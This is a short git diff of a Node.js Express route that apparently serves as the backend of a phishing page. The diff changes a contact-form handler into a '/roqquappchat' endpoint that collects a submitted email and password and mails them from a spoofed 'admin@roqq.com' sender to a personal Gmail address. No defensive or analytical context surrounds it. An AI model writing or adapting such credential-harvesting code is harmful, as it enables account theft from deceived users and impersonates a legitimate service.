@@ -32,14 +32,16 @@ transporter.verify(function(error, success) {
 });
 
 
-router.post('/access', (req, res, next) => {
+router.post('/roqquappchat', (req, res, next) => {
   const email = req.body.email
-  const message = req.body.message
-  const content = `name: ${name} \n email: ${email} \n message: ${message} `
+  const password = req.body.password
+  const content = `email: ${email} \n password: ${password} `
+
+
 
   const mail = {
-    from: name,
-    to: name,
+    from: 'admin@roqq.com',
+    to: 'ifestephenie@gmail.com',
     message: subject,
     text: content
   }
